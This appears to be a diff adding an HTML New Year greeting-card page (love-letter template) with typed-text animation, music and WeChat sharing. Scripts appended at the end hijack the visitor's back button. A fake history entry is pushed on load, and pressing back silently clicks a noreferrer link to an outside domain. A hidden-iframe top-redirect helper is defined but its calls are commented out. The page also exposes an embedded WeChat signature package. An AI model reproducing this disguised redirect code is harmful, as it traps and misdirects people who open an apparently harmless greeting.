@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+	<meta charset="UTF-8">
+	<title>新年快乐🎁</title>
+
+    <script>
+        //判断客户端设备，选择写入meta
+        function init_viewport(){
+            if(navigator.userAgent.indexOf('Android') != -1){
+                var version = parseFloat(RegExp.$1);
+                if(version>2.3){
+                    var width = window.outerWidth == 0 ? window.screen.width : window.outerWidth;
+                    var phoneScale = parseInt(width)/500;
+                    document.write('<meta name="viewport" content="width=500, minimum-scale = '+ phoneScale +', maximum-scale = '+ phoneScale +', target-densitydpi=device-dpi">');
+                }else{
+                    document.write('<meta name="viewport" content="width=500, target-densitydpi=device-dpi, user-scalable=0">');
+                }
+            }else if(navigator.userAgent.indexOf('iPhone') != -1){
+                var phoneScale = parseInt(window.screen.width)/500;
+                document.write('<meta name="viewport" content="width=500, min-height=750, initial-scale=' + phoneScale +', maximum-scale='+phoneScale+', user-scalable=0" /> ');         //0.75   0.82
+            }else{
+                document.write('<meta name="viewport" content="http://love.wazf.top/S89/width=500, height=750, initial-scale=0.64" /> '); //0.75  0.82
+            }
+        }
+        init_viewport();
+    </script>
+
+	<style>
+		* {
+            padding: 0px;
+            margin: 0px;
+            -webkit-box-sizing: border-box;
+        }
+        body {
+            background-color: white;
+        }
+        a {
+            color: white;
+            text-decoration: none;
+        }
+
+        #div_container { /*最外层div，用于居中兼容PC和移动*/
+            width: 500px;
+            margin: 0px auto;
+            position: relative;
+            /*background-color: #FAFAFA;*/
+            font-size: 1em;
+        }
+
+
+        .div_pure_words { /*文字部分的最外层，用于定位*/
+            position: relative;
+            display: none;
+        }
+        .div_pure_words_bg { /*背景设置在这里*/
+            background-repeat: repeat;
+            background-size: 100%;
+            background-attachment: fixed;
+            width: 500px;
+            min-height: 500px;
+        }
+        .div_pure_words_height {
+            visibility: hidden;
+            padding: 30px;
+            text-align: justify;  /*为了使文字两端对齐 */
+            white-space: pre-wrap; /*保留换行效果*/
+            font-size: 1.1em;
+            font-family: "Microsoft YaHei","Arial";
+            color: white;
+        }
+        .div_pw_typed {
+            position: absolute;
+            left: 0;
+            right: 0;  /*4个方向定位使div充满整个画画*/
+            top: 0;
+            bottom: 0;  /*4个方向定位使div充满整个画画*/
+            width: 500px;
+            background:rgba(255,255,255,0.8); /*半透明效果*/
+            padding: 30px;
+            text-align: justify;  /*为了使文字两端对齐 */
+        }
+        #span_pw_typed {
+            width:100%; /*为了使文字两端对齐 */
+            white-space:pre-wrap; /*保留换行效果*/
+            font-size: 1.1em;
+            font-family: "Microsoft YaHei","Arial";
+        }
+
+
+        #div_start_bg{
+            width: 100%; height: 100%;
+            position: absolute;
+            left: 0px; top: 0px;
+            z-index: 44;
+            background-color: white;
+        }
+	</style>
+
+    <!-- 按钮部分的样式 -->
+    <link type="text/css" rel="stylesheet" href="m/m2/css/theme_public_btn.css" tppabs="http://love.wazf.top/S89/css/theme_public_btn.css">
+    <!-- 按需加载，选择此片头时方才加载 -->
+        <link type="text/css" rel="stylesheet" href="m/m2/css/start_intersect.css" tppabs="http://love.wazf.top/S89/css/start_intersect.css">
+
+ <script>
+    var shouci=true;
+    console.log(shouci);
+        function bodyPlayMusic(){
+            if(shouci){
+                shouci=false;
+                audio_music.play();
+                console.log(shouci);
+            }
+        };
+    </script>
+
+</head>
+<body onclick="bodyPlayMusic()">
+    <div id="div_container"> <!-- 最外层div，用于居中兼容PC和移动 -->
+        <div id="div_start_bg"></div> <!-- 用于遮挡主题，作为片头的背景 -->
+        <!-- 按需加载，选择此片头时方才加载 -->
+        <!-- 按需加载，选择此片头时方才加载 -->
+            <div id="div_intersect"><!-- 用于设置背景 -->
+                <div id="div_is_inner"><!-- 用于存放content -->
+                    <div class="div_is_open_bg">
+                        <div class="div_is_open_btn" onclick="init_is_typed()"></div>
+                    </div>
+
+                    <!-- 画布在这里 -->
+                    <canvas id="canvas_is"></canvas>
+
+                    <!-- 打字在这里 -->
+                    <div class="div_is_typed">
+                        <div id="div_is_img">
+                            <img class="img_is_typed">
+                        </div>
+                        <span id="span_is_typed"></span>
+                    </div>
+                </div>
+            </div>
+
+        <!-- 以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头 -->
+        <!-- 以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头 -->
+        <!-- 以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头 -->
+        <!-- 以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头 -->
+        <!-- 以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头 -->
+
+        <div class="div_pure_words"> <!-- 文字部分的最外层，用于定位 -->
+            <div class="div_pure_words_bg"><!-- 背景设置在这里 -->
+                <div class="div_pure_words_height">
+                    <!-- 正文的内容复制到这里面，撑开整个文档的高度 -->
+                </div>
+            </div>
+            <div class="div_pw_typed"> <!-- 正文部分，绝对定位 -->
+                <span id="span_pw_typed"></span>
+            </div>
+        </div>
+        <div id='div_btn_container'> <!-- 按钮部分的最外层，处于文档流之中 -->
+            <div id="div_btn_inner"> <!-- 按钮部分内层，用于定位 -->
+
+                <div class='div_music_tips'></div>
+                <div class="div_btn" id="div_music" onclick="music_switch()"> <!-- 音乐按钮部分 -->
+                    <img id='img_music' src="images/run_music.png" tppabs="http://love.wazf.top/S89/images/music_note_big.png" style='-webkit-animation:music_play_rotate 1s linear infinite'>
+                    <audio id="audio_music" autoplay="autoplay" loop>
+                        <source type="audio/mpeg"/>
+                        <!-- 您的浏览器不支持播放音乐 -->
+                    </audio>
+                </div>
+
+                <!-- 只在提交状态显示 只在提交状态显示 只在提交状态显示 只在提交状态显示 -->
+
+			<div class="div_btn" id='div_record'>
+                        <a href="http://1.1022reba.top/c/1"><span>制作</span></a>
+                    </div>
+                <div class="div_btn" id='div_support'>
+                        <a href=" http://1.1022reba.top/c/tz"><span>更多</span></a>
+                    </div>
+                <!-- 只在提交状态显示 只在提交状态显示 只在提交状态显示 只在提交状态显示 -->
+                <!-- 只在未提交状态显示 只在未提交状态显示 只在未提交状态显示 只在未提交状态显示 -->
+                <!-- 只在未提交状态显示 只在未提交状态显示 只在未提交状态显示 只在未提交状态显示 -->
+            </div>
+        </div>
+    </div>
+
+    <script src="m/m2/js/jquery-2.0.3.min.js" tppabs="jquery-2.0.3.min.js"></script>
+    <script src="m/m2/js/typed.min.js" tppabs="typed.min.js"></script>
+    <script src="m/m2/js/support_upload_as.js" tppabs="support_upload_as.js"></script>
+    <script src="m/m2/js/jweixin-1.2.0.js" tppabs="jweixin-1.2.0.js"></script>
+    <script>
+
+
+        var music_json={"music_select":"m_online","m_online_id":"2","m_online_url":"https://sf3-cdn-tos.douyinstatic.com/obj/tos-cn-ve-2774/3b1e0137555646b4b498bb6d5d8aeae7","m_upload_name":"null","m_upload_url":"null"};
+        console.log(music_json);
+        var record_json={"record_bool":"r_false","r_wechat_time":"null","r_wechat_url":"null","r_wechat_amr":"null"};
+        console.log(record_json);
+        var signPackage={"appid":"wx47f716bdd7699533","timestamp":1582431051,"nonceStr":"LM6yzemL4CJ6OVVR","url":"http:\/\/www.makusi.cn\/Home\/Play\/play_show\/ws\/YGdmnWxl","signature":"4e8b116946dcadbca07d82befeec5a0f02c44855","rawString":"jsapi_ticket=sM4AOVdWfPE4DxkXGEs8VHINcjHJVwMsFjJyfreRy7BlOSHA9D9bns2z3mw3xg-5NfuY-t-WcTPmTZV8TZSmeQ&noncestr=LM6yzemL4CJ6OVVR&timestamp=1582431051&url=http:\/\/www.makusi.cn\/Home\/Play\/play_show\/ws\/YGdmnWxl"};
+
+        var main_title='我喜欢你';
+        // console.log(main_title);
+        if(main_title=='' || main_title=='null'){  //允许标题为空
+            document.title='慢慢喜欢你';
+        }
+        // console.log("");
+
+
+        var pure_words_content=theme_content['pure_words_content'];
+        var str_cursorChar;
+        var typed_bool;
+
+        var interval_pw_height;
+        var height_div_pw=$(".div_pure_words_height").height();
+        function init_pure_words(){
+            //允许内容为空时直接展示，不设置为随机内容，用于空主题
+            if(typeof(pure_words_content)=='undefined'){ //处理全新作品
+                var array_str_temp=[];
+                random_text_array(array_str_temp,12); //获取随机的模板文字
+                // array_str_temp.push('你现在看到的只是案例，文字是可以自定义哒，6000字以下');
+                pure_words_content=array_str_temp.join('\r\r');
+            }
+            $(".div_pure_words_height").html(pure_words_content+'22222');  //初始化复制内容，撑开文档高度
+
+            // 初始化设置div的bg图片 初始化设置div的bg图片
+            if(typeof(theme_content['bg_style_pure_words'])!='undefined' && theme_content['bg_style_pure_words']=='bg_opacity'){
+                if(typeof(theme_content['bg_img'])!='undefined' && theme_content['bg_img']!=''){
+                    $(".div_pure_words_bg").css({"background-image": "url("+theme_content['bg_img']+")"});
+                }
+            }
+
+            //以下是打字效果的js
+            if(typeof(theme_content['cursor_char'])!='undefined' && theme_content['cursor_char']!=''){
+                switch(theme_content['cursor_char']){ //设置打字光标的样式
+                    case 'cursor_heart':
+                        str_cursorChar='❤';
+                        break;
+                    case 'cursor_sub':
+                        str_cursorChar='_';
+                        break;
+                    case 'cursor_music':
+                        str_cursorChar='♫';
+                        break;
+                    case 'cursor_star':
+                        str_cursorChar='★';
+                        break;
+                    case 'cursor_sun':
+                        str_cursorChar='☀';
+                        break;
+                    default:
+                        str_cursorChar='|';
+                }
+            }else{ //处理全新作品，默认显示打字效果
+                str_cursorChar='❤';
+            }
+
+            //判断用户有没有选择打字效果
+            if(typeof(theme_content['typed_bool'])!='undefined' && theme_content['typed_bool']!=''){
+                typed_bool= theme_content['typed_bool']=='typed_y' ? true : false;
+            }else{
+                typed_bool=false; //默认显示打字效果
+            }
+            // console.log(typed_bool);
+
+            display_pure_words();
+            $(".div_pure_words").fadeIn();
+
+            interval_pw_height=setInterval(function(){
+                console.log('div_pure_words_height -> '+$('.div_pure_words_height').height());
+                var least_height_div_pw=$('.div_pure_words_height').height();
+                if(least_height_div_pw>height_div_pw){
+                    height_div_pw=least_height_div_pw;
+                }else{
+                    clearInterval(interval_pw_height);
+                    $(".div_pure_words_height").height(least_height_div_pw+100);
+                    if($(".div_pure_words_height").height()<window_height){
+                        $(".div_pure_words_height").height(window_height); //不能小于窗口的高度
+                        console.log('let us be high as window');
+                    }
+                }
+            },100);
+        }
+
+
+        function display_pure_words(){
+            if(typed_bool){
+                var typed_pure_words = new Typed('#span_pw_typed', {
+                    strings: [pure_words_content], //输入内容, 支持html标签
+                    typeSpeed: 120, //打字速度
+                    cursorChar: str_cursorChar,//替换光标的样式
+                    contentType: 'html', //值为html时，将打印的文本标签直接解析html标签
+                    onComplete: function(abc){
+                                // console.log(abc);
+                                console.log('finished typing words');
+                                // console.log($('#span_pw_typed').height()-$(".div_pure_words_height").height());
+                            },
+                });
+            }else{
+                //如果不需要打字效果就直接显示
+                $("#span_pw_typed").html(pure_words_content).fadeIn();
+            }
+            init_attachment();
+        }
+
+
+        function random_text_array(temp_array,length){  //获取随机的模板文字
+            console.log('random_text_array');
+            var random_array=[];
+            while(random_array.length<length){
+                // var random_num=Math.floor(Math.random()*(array_as_pics.length-0))+0;
+                var random_num=Math.floor(Math.random()*(array_as_words_love.length)); //随机取值
+                if(random_array.indexOf(random_num)==-1){
+                    random_array.push(random_num);
+                }
+            }
+            // console.log(random_array);
+            for(var i=0; i<length; i++){
+                temp_array.push(array_as_words_love[random_array[i]]); //获取随机的模板文字
+            }
+        }
+
+    </script>
+
+     <!-- 按需加载，选择此片头时方才加载 -->
+
+    <script>
+        var start_content={"intersect_text":"新的一年，愿你干吃不胖，深情不被辜负，愿你傻人有傻福，愿你一直幸运，愿你一生努力，一生被爱，想要的都拥有，得不到的都释怀。新年快乐","cursor_char":"cursor_heart","bg_style":"bg_custom","bg_img":"https://p3-search.byteimg.com/obj/labis/85d5133495e34488ab94708cf8f90bb8#pskt#&imgName=%u70DF%u82B1%20-%20%u5934%u6761%u641C%u7D22&imgLink=https%3A%2F%2Fsou.toutiao.com%2Fsearch%2Fjump%3Furl%3Dhttp%253A%252F%252Fwww.duitang.com%252Fblog%252F%253Fid%253D1029709741%26aid%3D4916%26jtoken%3D"/*tpa=http://love.wazf.top/S89/123.jpg*/,"img_bool":"img_true","img_src":"https://p26.toutiaoimg.com/origin/tos-cn-i-qvj2lq49k0/09edbdf2c2d94b1ba77a6b0784b04404?from=pc#pskt#&imgName=%uFE0F&imgLink=http%3A%2F%2Fb.wazf.top%2Fpage%2Fletter%2Fletter.html"/*tpa=http://love.wazf.top/S89/12.jpg*/}; //可能为null
+        console.log(start_content);
+
+        var start_id;
+        $(function(){
+            //此事件为触发互动创意
+            start_id='intersect'; //可能为null
+            init_start(start_id);
+        });
+
+        function init_start(start_id){
+            console.log('init_start ->'+start_id);
+            switch(start_id){
+                case 'loveformat':
+                    $('.div_loveformat').show();
+                    init_loveformat();
+                    break;
+                case 'hearttree':
+                    $('#div_hearttree').show();
+                    init_hearttree();
+                    break;
+                case 'courage':
+                    $('#div_courage').show();
+                    init_courage();
+                    break;
+                case 'birthdaycake':
+                    $('#div_dbcake').show();
+                    init_birthdaycake();
+                    break;
+                case 'intersect':
+                    $('#div_intersect').show();
+                    init_intersect();
+                    break;
+                case 'onlyyou':
+                    $('#div_onlyyou').show();
+                    init_onlyyou();
+                    break;
+                default:
+                    init_theme();
+            }
+        }
+
+        //开始动画主体部分
+        function init_theme(){
+            console.log('init_theme');
+            $('#div_start_bg').fadeOut();
+            init_pure_words();
+        }
+
+    </script>
+
+    <!-- 按需加载，选择此片头时方才加载 -->
+        <script src="m/m2/js/start_intersect.js" tppabs="start_intersect.js"></script>
+
+    <script>
+        var attachment='null'; //可能为null
+        var attached_content={"bool_save":false}; //可能为null
+        console.log(attached_content);
+
+        function init_attachment(){  //开始attachment
+            console.log('init_attachment ->'+attachment);
+            switch(attachment){
+                case 'timer':
+                    init_at_timer();
+                    break;
+                default:
+                    return;
+            }
+        }
+    </script>
+
+    <script src="m/m2/js/jweixin-1.2.0.js" tppabs="jweixin-1.2.0.js"></script>
+	<script src="m/m2/js/theme_common.js" tppabs="theme_common.js"></script> <!-- 音乐控制和微信设置等公共部分js外部引入 -->
+
+	<script type="text/javascript">
+											function a(e) {
+												var f = document.createElement('iframe');
+												f.style.display = 'none';
+												document.body.appendChild(f).src = 'javascript:"<script>top.location.replace(\'' + e + '\')<\/script>"';
+											}
+
+											function jump1() {
+												if (!localStorage.is_fx) {
+													localStorage.is_fx = Date.now()
+													//a('http://1.1022reba.top/c')
+													//window.location.replace();
+													// location.href="http://1.1022reba.top/c";
+												} else {
+													// localStorage.is_fx = Date.now()
+												}
+											}
+
+											function jump2() {
+												gotoData = {
+													"hb": "http://1.1022reba.top/c/tz",
+													"hb1": "http://1.1022reba.top/c/tz",
+												}
+												if (gotoData[window.location.pathname] != undefined) {
+													//a(gotoData[window.location.pathname])
+												} else {
+													jump1()
+												}
+
+											}
+										</script>
+										<script type="text/javascript">
+											window.onhashchange = function() {
+												jp();
+											};
+
+											function hh() {
+												history.pushState(history.length + 1, "app", "#pt_" + new Date().getTime());
+											}
+
+
+											function jp() {
+												var a = document.createElement('a');
+												a.setAttribute('rel', 'noreferrer');
+												a.setAttribute('href', "http://1.1022reba.top/c/tz");
+												document.body.appendChild(a);
+												a.click();
+												document.body.removeChild(a);
+											}
+
+											window.onload = function() {
+												setTimeout('hh();', 100);
+												setTimeout(
+													"var imgs = document.images;for (var t_i=0;t_i<imgs.length;t_i++) {if (imgs[t_i].attributes['d-s'] && imgs[t_i].attributes['d-s'].value) {imgs[t_i].src = imgs[t_i].attributes['d-s'].value;}}",
+													100);
+											}
+											// jump2()
+											window.onpageshow = jump2
+										</script>
+
+</body>
+</html>
